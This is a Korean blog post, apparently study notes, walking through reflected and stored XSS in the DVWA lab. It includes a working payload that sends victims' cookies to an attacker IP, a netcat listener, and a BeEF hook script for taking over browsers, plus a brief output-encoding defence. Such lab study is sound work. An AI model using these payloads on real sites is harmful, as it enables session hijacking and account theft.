---
layout: post
title: "XSS 공부"
date: 2025-09-28 17:00:00 +0900
categories: [웹 해킹]
---

### 1. 개요

XSS(Cross-Site Scripting)는 공격자가 웹 애플리케이션에 악성 스크립트를 삽입하여 다른 사용자의 브라우저에서 해당 스크립트가 실행되도록 만드는 공격이다. 이 공격은 [A03: Injection](https://hamap0.github.io/projects/owasp-top-10/2025/08/27/A03_Injection.html) 보고서에서 다룬 인젝션 공격의 한 종류이며, 주로 세션 쿠키 탈취 등에 사용된다.

---

### 2. 기본 유형 및 실습

#### **Reflected XSS (반사형)**
공격 스크립트가 URL 파라미터 등을 통해 서버로 전달된 후, 서버가 그 값을 응답 페이지에 그대로 포함하여 사용자에게 돌려줄 때 발생한다.

*   **DVWA 실습:**
    `XSS (Reflected)` 페이지에서 `name` 파라미터 값으로 `<script>alert('Reflected XSS')</script>`를 주입하면 서버 응답에 이 스크립트가 포함되어 경고창이 실행된다.

   ![XssReflected](/assets/images/Xss_1.png)

#### **Stored XSS (저장형)**
공격 스크립트가 게시판이나 방명록처럼 서버의 데이터베이스에 영구적으로 저장될 때 발생한다. 해당 페이지를 방문하는 모든 사용자가 공격의 영향을 받는다.

*   **DVWA 실습:**
    `XSS (Stored)` 페이지의 방명록에 `<script>alert('Stored XSS')</script>`를 포함한 메시지를 남기면 해당 스크립트가 데이터베이스에 저장된다. 이후 이 페이지를 방문하는 모든 사용자의 브라우저에서 경고창이 실행된다.

   ![XssStored](/assets/images/Xss_2.png)

---

### 3. 심화 활용: 쿠키 탈취

XSS 취약점은 사용자의 세션 쿠키를 탈취하여 계정을 도용하는 세션 하이재킹 공격에 사용될 수 있다.

#### **1. 공격자 리스너**
탈취한 쿠키를 수신하기 위해 공격자 PC에 서버가 필요하다. [보안 분석을 위한 리눅스 명령어 공부](https://hamap0.github.io/study/시스템-해킹/2025/09/14/보안-분석을-위한-리눅스-명령어-공부.html)에서 다룬 `netcat`을 이용해 특정 포트에서 연결을 대기하는 리스너를 실행할 수 있다.
```bash
# 80번 포트에서 연결을 대기하며 상세 정보를 출력
sudo nc -lvnp 80
```

#### **2. 쿠키 탈취 페이로드**
피해자의 브라우저에서 `document.cookie` 값을 읽어와 공격자 서버 `192.9.200.12`로 전송하는 스크립트이다.
```javascript
<script>
  document.location='http://192.9.200.12/?cookie=' + btoa(document.cookie);
</script>
```
*   `btoa()`: 쿠키 값에 포함될 수 있는 특수문자로 인해 URL이 깨지는 것을 방지하기 위해 Base64로 인코딩한다.

#### **3. 결과 확인**
이 페이로드를 Stored XSS 취약점이 있는 방명록에 삽입하면 해당 페이지를 방문하는 사용자의 브라우저는 스크립트를 실행한다. 그 결과 공격자의 `netcat` 리스너에는 피해자의 쿠키 값이 포함된 HTTP GET 요청이 수신된다.

   ![XssCookie](/assets/images/Xss_3.png)

### 4. 심화 활용 2: 브라우저 제어권 획득 (BeEF 연동)

XSS 공격의 파급력은 쿠키 탈취에 그치지 않는다. **BeEF(The Browser Exploitation Framework)**와 연동하면 피해자의 브라우저를 좀비처럼 제어하여 추가 공격을 수행할 수 있다.

#### **1. BeEF 실행 및 Hook URL 확인**
1.  공격자 PC에서 BeEF 프레임워크를 실행한다.
    ```bash
    sudo beef-xss
    ```
2.  BeEF의 관리자 페이지(UI)에 접속하여 로그인한다.
3.  관리자 페이지에 표시된 **Hook URL** (예: `<script src="http://192.9.200.12:3000/hook.js"></script>`)을 복사한다. 이 스크립트가 피해자의 브라우저를 제어하는 핵심 코드이다.

#### **2. Hook 스크립트 주입 (Stored XSS)**
1.  복사한 Hook URL 스크립트 전체를 Stored XSS 취약점이 있는 DVWA 방명록에 삽입하고 게시글을 등록한다.

#### **3. 브라우저 Hooking 및 제어**
1.  피해자가 해당 방명록 페이지를 방문하면 브라우저는 자신도 모르게 **`hook.js`** 스크립트를 실행하고 공격자의 BeEF 서버에 연결된다.
2.  공격자는 BeEF 관리자 페이지의 `Online Browsers` 목록에서 연결된 피해자의 브라우저(Hooked Browser)를 확인할 수 있다.
   ![XssBeef](/assets/images/Xss_4.png)
3.  공격자는 `Commands` 탭의 다양한 모듈을 사용하여 피해자 브라우저를 대상으로 추가 공격을 수행할 수 있다.
    *   **Get Cookies**: 피해자의 쿠키 정보를 가져온다.
    *   **Redirect Browser**: 피해자의 브라우저를 특정 피싱 사이트로 강제 이동시킨다.
    *   **Create Alert Dialog**: 피해자의 화면에 임의의 경고창을 띄운다.

---

### 5. 방어 방안: 출력 인코딩

XSS 공격의 근본적인 원인은 사용자가 입력한 데이터를 서버가 그대로 HTML의 일부로 해석하여 출력하기 때문이다. 이를 막는 가장 효과적인 방법은 **출력 인코딩(Output Encoding)**이다.

사용자가 입력한 문자열에 포함된 `<`, `>` 같은 특수문자를 브라우저가 HTML 태그로 해석하지 못하도록 아래와 같이 안전한 문자(HTML Entities)로 변환하여 출력해야 한다.
*   `<` → `&lt;`
*   `>` → `&gt;`

이렇게 인코딩된 문자열은 브라우저 화면에는 원래의 꺾쇠 기호로 보이지만 HTML 파서는 이를 태그의 시작과 끝이 아닌 단순한 텍스트로만 인식하므로 스크립트가 실행되지 않는다.

<hr class="short-rule">





### 시각 자료(이미지) 제작을 위한 스크립트

#### **이미지 1 제작 (Reflected XSS)**

1.  웹 브라우저에서 DVWA의 `XSS (Reflected)` 페이지로 이동합니다.
2.  입력창에 `<script>alert('Reflected XSS')</script>`를 입력하고 `Submit` 버튼을 클릭합니다.
3.  화면에 "Hello" 라는 문구와 함께 자바스크립트 경고창(alert)이 나타납니다.
4.  이 상태의 브라우저 화면 전체를 스크린샷으로 찍습니다.
5.  이미지 편집 프로그램을 사용하여 스크린샷을 엽니다.
6.  두 부분에 하이라이트를 적용합니다.
    *   **원인:** 브라우저 주소창의 URL에 포함된 스크립트 구문 (`?name=<script>...`)
    *   **결과:** 화면 중앙에 나타난 경고창(`Reflected XSS`)
7.  수정된 이미지를 저장하여 게시글에 삽입합니다.

#### **이미지 2 제작 (Stored XSS)**

1.  DVWA의 `XSS (Stored)` 페이지로 이동합니다.
2.  `Message` 입력창에 `<script>alert('Stored XSS')</script>`를 포함한 내용을 입력하고 `Sign Guestbook` 버튼을 클릭합니다.
3.  페이지가 새로고침되면서 방금 제출한 스크립트가 실행되어 경고창이 나타납니다.
4.  방명록 목록에 스크립트가 포함된 게시글이 보이고 동시에 경고창이 떠 있는 화면 전체를 스크린샷으로 찍습니다.
5.  이미지 편집 프로그램을 사용하여 스크린샷을 엽니다.
6.  두 부분에 하이라이트를 적용합니다.
    *   **원인:** 방명록에 저장되어 출력된 스크립트가 포함된 게시글
    *   **결과:** 그로 인해 실행된 경고창(`Stored XSS`)
7.  수정된 이미지를 저장하여 게시글에 삽입합니다.

#### **이미지 3 제작 (쿠키 값 수신)**

1.  (준비) **공격자 PC의 터미널**과 **피해자의 웹 브라우저**를 준비합니다.
2.  **공격자 PC 터미널**에서 `sudo nc -lvnp 80` 명령어를 실행하여 리스너를 시작합니다.
3.  **피해자의 웹 브라우저**에서 DVWA의 `XSS (Stored)` 페이지로 이동하여 쿠키 탈취용 `<script>` 페이로드를 방명록에 입력하고 `Sign Guestbook` 버튼을 클릭합니다.
4.  **공격자 PC 터미널**을 확인하면 브라우저로부터의 HTTP 요청이 수신되어 아래와 같은 텍스트가 출력됩니다.
    ```
    GET /?cookie=c2VjdXJpdHk9bG93OyBQSFBTRVNTSUQ9... HTTP/1.1
    Host: 192.9.200.12
    ...
    ```
5.  이 HTTP 요청 정보가 모두 출력된 **공격자 PC 터미널** 화면 전체를 스크린샷으로 찍습니다.
6.  이미지 편집 프로그램을 사용하여 `/?cookie=` 뒤에 따라오는 Base64로 인코딩된 긴 문자열 부분에 명확하게 하이라이트를 적용합니다.
7.  수정된 이미지를 저장하여 게시글에 삽입합니다.

#### **이미지 4 제작 (BeEF 연동 성공)**

이 이미지는 Stored XSS를 통해 피해자의 브라우저 제어권을 획득한 상황을 보여준다.

1.  **BeEF 관리자 페이지 캡처:**
    *   `4. 심화 활용 2`의 3단계 과정에서, 피해자의 브라우저가 `Online Browsers` 목록에 나타난 BeEF 관리자 페이지 화면을 스크린샷으로 찍는다.
2.  **명령 실행 결과 캡처:**
    *   `Commands` 탭에서 `Get Cookies`나 `Create Alert Dialog` 같은 간단한 명령을 실행하고, 그 결과가 표시된 화면을 스크린샷으로 찍는다.
3.  **최종 이미지 편집:**
    *   두 개의 스크린샷을 하나로 합치거나, 가장 핵심적인 화면(피해자 브라우저가 목록에 나타난 화면)을 선택한다.
    *   이미지에서 `Online Browsers` 목록에 나타난 피해자의 IP 주소와 OS/브라우저 아이콘에 명확한 하이라이트를 적용한다.
    *   만약 명령 실행 결과 이미지를 사용한다면, 실행한 `Module Name`과 그 `Command Results` 부분에 하이라이트를 적용한다.
    *   수정된 이미지를 게시글에 삽입한다.